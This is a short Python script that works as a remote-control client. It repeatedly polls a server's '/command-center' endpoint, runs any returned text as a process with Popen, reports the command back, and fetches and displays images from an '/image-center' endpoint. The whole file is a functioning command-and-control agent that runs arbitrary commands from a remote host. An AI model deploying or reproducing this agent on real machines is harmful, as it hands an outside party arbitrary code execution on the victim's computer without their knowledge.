from PIL import UnidentifiedImageError, Image
from requests import post, get
from subprocess import Popen
from time import sleep
from os import remove

DELAY = 5
IP = "127.0.0.1"
PORT = 80
SCHEME = "http"


def main() -> None:
    while True:
        get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
        get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
        if get_commands_response.status_code != 204:
            Popen(get_commands_response.text)
            post(
                f"{SCHEME}://{IP}:{PORT}/command-center",
                data={"command": get_commands_response.text},
            )
        if get_images_response.status_code != 204:
            with open("temp", "wb") as temp_image_file:
                temp_image_file.write(get_images_response.content)
            try:
                Image.open("temp").show()
            except UnidentifiedImageError:
                pass
            remove("temp")
        sleep(DELAY)


if __name__ == "__main__":
    main()
